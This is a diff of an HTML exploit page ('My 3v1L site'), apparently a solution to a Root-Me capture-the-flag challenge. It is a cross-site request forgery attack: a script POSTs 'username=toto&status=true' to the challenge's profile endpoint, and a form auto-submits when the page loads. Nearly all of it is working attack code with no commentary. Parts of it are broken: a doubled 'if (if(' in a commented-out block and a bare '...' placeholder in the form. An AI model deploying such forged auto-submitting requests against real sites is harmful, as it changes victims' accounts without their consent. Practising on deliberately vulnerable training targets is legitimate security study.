@@ -2,53 +2,39 @@
 #http://stackoverflow.com/questions/9713058/sending-post-data-with-a-xmlhttprequest 
 
 
-
-<!DOCTYPE html>
-<html>
-<head>
-
 <script type="text/javascript">
-//var post_data = "username=toto&status=true";
+var post_data = "username=toto&status=true";
 // Sous IE
 // var xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
-
 var xmlhttp=new XMLHttpRequest();
+/*
 var post_data = new FormData();
 post_data.append('user', 'person');
 post_data.append('pwd', 'password');
+*/
 xmlhttp.open("POST",'http://challenge01.root-me.org/web-client/ch22/?action=profile', true);
-
 //Send the proper header information along with the request
 xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 xmlhttp.setRequestHeader("Content-length", post_data.length);
 xmlhttp.setRequestHeader("Connection", "close");
+/*
 xmlhttp.onreadystatechange = function () { 
 if (if(xmlhttp.readyState == 4 && xmlhttp.status == 200) 
 { 
    alert(xmlhttp.responseText);
 } 
 }; 
-//document.getElementsByName("status")[0].disabled = false;
-//document.getElementsByName("status")[0].checked = true;
+*/
 xmlhttp.send(post_data);
 </script>
 
 </head>
 <body>
 <h1>My 3v1L site</h1>
-<form name="myform" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
-<div class="form-group">
-<label>Username:</label>
-<input type="text" name="username" value="toto">
-</div>
-<br>		
-<div class="form-group">
-<label>Status:</label>
-<input type="checkbox" name="status" enable="" checked="checked">
-</div>
-<br>	
-<button type="submit">Submit</button>
+
+<form name="myform" ...
 </form>
+
 <script type="text/javascript">
 document.myform.submit();
 </script>
